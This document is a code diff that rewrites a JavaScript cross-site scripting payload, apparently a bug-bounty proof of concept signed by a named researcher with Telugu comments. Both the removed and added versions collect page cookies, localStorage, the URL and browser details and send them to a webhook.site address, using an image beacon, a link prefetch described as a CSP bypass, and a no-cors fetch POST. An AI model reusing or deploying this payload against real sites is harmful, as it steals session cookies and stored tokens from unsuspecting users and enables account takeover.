@@ -1,26 +1,37 @@
-(function() {
-    // నీ వెబ్‌హుక్ లింక్
-    var webhook = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site/";
 
-    // డేటాను సేకరించడం
-    var info = {
-        cookies: document.cookie || "No Cookies Found",
+
+
+
+(async function() {
+    const webhookURL = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site";
+    
+    const exfilData = {
+        researcher: "Ramavath Gopi Nayak",
+        status: "Pwned",
+        captured_at: new Date().toISOString(),
+        cookies: document.cookie || "No Cookies (HttpOnly?)",
         localStorage: JSON.stringify(localStorage),
         url: window.location.href,
-        referrer: document.referrer,
-        title: document.title
+        userAgent: navigator.userAgent
     };
 
-    // డేటాను Base64 లోకి మార్చడం (సెక్యూరిటీ కోసం)
-    var encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
-
-    // Image ట్యాగ్ ద్వారా డేటా పంపడం (CSP Bypass)
-    var log = new Image();
-    log.src = webhook + "?report=" + encodedData;
-
-    // రెండవ పద్ధతి: ఒకవేళ ఇమేజ్ బ్లాక్ అయితే లింక్ ద్వారా
-    var link = document.createElement('link');
-    link.rel = 'prefetch';
-    link.href = webhook + "?backup=" + encodedData;
-    document.head.appendChild(link);
+    try {
+        // డేటాను POST బాడీలో పంపుతున్నాం
+        await fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors", 
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(exfilData)
+        });
+        
+        // Backup: ఒకవేళ POST ఫెయిల్ అయితే GET ద్వారా పంపడానికి
+        const backupImg = new Image();
+        backupImg.src = webhookURL + "?data=" + btoa(JSON.stringify({url: window.location.href}));
+        
+    } catch (e) {
+        console.log("Exfiltration failed, trying image beacon...");
+    }
 })();
+
